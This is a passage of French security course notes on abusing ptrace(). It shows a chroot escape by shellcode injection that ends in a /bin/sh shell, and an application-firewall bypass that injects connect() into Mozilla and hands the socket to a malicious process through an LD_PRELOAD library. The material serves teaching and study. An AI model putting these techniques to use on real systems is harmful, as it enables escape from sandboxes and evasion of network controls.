**Qu'est-ce que chroot ?**

* **Restriction** de la racine du système de fichiers
* Le processus ne voit que `/nouvelle_racine/` au lieu de `/`
* **Mais** : Contact extérieur possible via signaux, mémoire partagée...

**Exploit avec ptrace**

```bash
# Depuis l'intérieur du chroot
# 1. Scanner tous les PIDs possibles
for pid in $(seq 1 65535); do
    # 2. Essayer de s'attacher
    if ptrace(PTRACE_ATTACH, pid, NULL, NULL) == 0; then
        # 3. Injecter un shellcode d'évasion
        inject_escape_shellcode(pid);
        break;
    fi
done
```

**Shellcode d'évasion typique**

```c
// Shellcode qui fait :
// 1. chdir("../../../../../../")  // Sortir du chroot
// 2. chroot(".")                   // Nouveau chroot sur /
// 3. execve("/bin/sh", ...)        // Shell libre !
```

***

#### 4. Contournement de firewall applicatif

**Le problème**

```
Firewall applicatif = ACLs basées sur l'application
→ Mozilla autorisé = tremplin !
```

**Objectif**

1. **Injecter un `connect()`** dans Mozilla
2. **Récupérer le descripteur** de fichier
3. **Transférer le descripteur** au processus malicieux

**Schéma de l'attaque**

```
[Processus malicieux] ←──── Descripteur ────→ [Mozilla]
                                                  │
                                              connect()
                                                  │
                                              [Serveur externe]
```

**Code d'injection dans Mozilla**

```c
// Shellcode injecté dans Mozilla :
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(80);
inet_aton("192.168.1.100", &addr.sin_addr);

// Connexion (autorisée car c'est Mozilla !)
connect(sockfd, (struct sockaddr*)&addr, sizeof(addr));

// Transférer le descripteur au processus malicieux
transfer_fd_via_unix_socket(sockfd, malicious_process_socket);
```

**Transfert de descripteur via socket UNIX**

```c
// Fonctionnalité méconnue : transmettre un FD entre processus !
struct cmsghdr *ch;
struct msghdr msg;
char ancillary[CMSG_SPACE(sizeof(fd))];

ch = CMSG_FIRSTHDR(&msg);
ch->cmsg_level = SOL_SOCKET;
ch->cmsg_type = SCM_RIGHTS;  // ← La magie !
*(int*)CMSG_DATA(ch) = fd;   // Le descripteur à transférer

sendmsg(unix_sockfd, &msg, 0);
```

**Solution complète avec LD\_PRELOAD**

```c
// Bibliothèque liberte.so
int connect(int sockfd, struct sockaddr *servaddr, socklen_t addrlen) {
    pid_t mozilla_pid = atoi(getenv("PTRACE_PWNED"));
    
    // Créer socket UNIX pour récupérer le FD
    int unix_fd = socket(PF_UNIX, SOCK_STREAM, 0);
    
    if (fork() == 0) {
        // Processus enfant : injecter dans Mozilla
        inject_shellcode(mozilla_pid, servaddr);
        exit(0);
    }
    
    // Processus parent : récupérer le FD transféré
    int real_fd = receive_fd(unix_fd);
    dup2(real_fd, sockfd);  // Remplacer notre FD par celui de Mozilla
    
    return sockfd;
}
```

**Utilisation**

```bash
# Toutes les applications passent par le "tunnel" Mozilla !
export LD_PRELOAD="/home/moi/lib/liberte.so"
export PTRACE_PWNED="1234"  # PID de Mozilla

wget http://slashdot.org/   # ← Passe par Mozilla !
curl http://google.com/     # ← Passe par Mozilla !
```

***

### <mark style="color:blue;">Limitations et avenir</mark>

#### Limites de ptrace()

* **Fonctions limitées** : API rigide
* **Portabilité impossible** : Spécifique à Linux
* **Bugs historiques** : Comportements non documentés

#### L'avenir : DTrace-like

* **Solution kernel-space** complète
* **Haut niveau** : Scripts au lieu de C
* **Scriptable** : Plus facile à utiliser

**Exemple avec SystemTap (équivalent DTrace sous Linux)**

```bash
# Script SystemTap (plus simple que ptrace !)
probe syscall.connect {
    printf("Connect vers %s:%d\n", inet_ntoa($servaddr), $port);
}
```

***
